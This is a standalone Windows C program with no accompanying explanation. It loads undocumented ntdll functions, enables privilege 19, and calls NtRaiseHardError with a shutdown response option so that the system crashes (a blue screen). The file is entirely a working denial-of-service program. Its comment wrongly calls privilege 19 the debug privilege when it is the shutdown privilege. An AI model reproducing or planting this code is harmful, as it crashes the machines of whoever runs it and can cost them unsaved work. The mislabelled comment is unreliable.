#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define necessary NTSTATUS values if not included by default
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_FLOAT_MULTIPLE_FAULTS
#define STATUS_FLOAT_MULTIPLE_FAULTS ((NTSTATUS)0xC00002A3L)
#endif

typedef NTSTATUS (NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS (NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int main()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    
    // Get the address of the RtlAdjustPrivilege function
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    if (NtCall == NULL) {
        return 1;
    }

    // Get the address of the NtRaiseHardError function
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    if (NtCall2 == NULL) {
        return 1;
    }

    // Adjust privilege to enable SeDebugPrivilege
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    if (NtRet != STATUS_SUCCESS) {
        return 1;
    }

    // Raise a hard error to trigger a crash
    NtRet = NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
    if (NtRet != STATUS_SUCCESS) {
        return 1;
    }

    return 0;
}
